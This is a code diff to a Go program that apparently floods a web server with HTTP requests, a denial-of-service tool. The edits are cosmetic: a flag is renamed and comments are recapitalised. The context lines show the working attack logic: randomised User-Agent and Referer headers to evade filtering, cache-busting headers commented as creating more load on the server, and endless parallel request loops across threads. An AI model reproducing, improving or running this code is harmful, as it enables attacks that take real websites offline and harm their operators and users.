@@ -55,7 +55,7 @@ var (
 	paramJoiner     string
 	reqCount        uint64
 	threads         int
-	check           bool
+	checkIP         bool
 	timeout         int
 	timeoutDuration time.Duration
 	sleep           int
@@ -131,15 +131,15 @@ func get() {
 	}
 
 	req.Header.Set("User-Agent", uarand.GetRandom())
-	req.Header.Add("Pragma", "no-cache")                                                       // used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
-	req.Header.Add("Cache-Control", "no-store, no-cache")                                      // creates more load on web server
-	req.Header.Set("Referer", referrers[rand.Intn(len(referrers))]+buildblock(rand.Intn(5)+5)) // uses random referer from list
+	req.Header.Add("Pragma", "no-cache")                  // Used in case https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Pragma
+	req.Header.Add("Cache-Control", "no-store, no-cache") // Creates more load on web server
+	req.Header.Set("Referer", referrers[rand.Intn(len(referrers))]+buildblock(rand.Intn(5)+5))
 	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
 	req.Header.Set("Connection", "keep-alive")
 
 	resp, err := c.Do(req)
 
-	atomic.AddUint64(&reqCount, 1) // increment
+	atomic.AddUint64(&reqCount, 1) // Increment number of requests sent
 
 	if os.IsTimeout(err) {
 		fmt.Println(colourise(red, "Status: Timeout"))
@@ -157,7 +157,7 @@ func get() {
 func loop() {
 	for {
 		go get()
-		time.Sleep(sleepDuration) // sleep before sending request again
+		time.Sleep(sleepDuration) // Sleep before sending request again
 	}
 }
 
@@ -169,10 +169,10 @@ func main() {
 	flag.IntVar(&timeout, "timeout", 3000, "Timeout in milliseconds.")
 	flag.IntVar(&sleep, "sleep", 1, "Sleep time in milliseconds.")
 	flag.IntVar(&threads, "threads", 1, "Number of threads.")
-	flag.BoolVar(&check, "check", false, "Enable IP address check.")
+	flag.BoolVar(&checkIP, "check", false, "Enable IP address check.")
 	flag.Parse()
 
-	if check {
+	if checkIP {
 		fetchIP()
 	}
 
@@ -192,7 +192,7 @@ func main() {
 		os.Exit(1)
 	}
 
-	// convert values to milliseconds
+	// Convert values to milliseconds
 	timeoutDuration = time.Duration(timeout) * time.Millisecond
 	sleepDuration = time.Duration(sleep) * time.Millisecond
 
@@ -211,11 +211,11 @@ func main() {
 	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
 	go func() {
 		<-c
-		fmt.Println(colourise(blue, "\nAttempted to send"), reqCount, colourise(blue, "requests in"), time.Since(start)) // print when control+c is pressed
+		fmt.Println(colourise(blue, "\nAttempted to send"), reqCount, colourise(blue, "requests in"), time.Since(start)) // Print when control+c is pressed
 		os.Exit(0)
 	}()
 
-	p := parallel.NewParallel() // runs function in parallel
+	p := parallel.NewParallel() // Runs function in parallel
 	for i := 0; i < threads; i++ {
 		p.Register(loop)
 	}
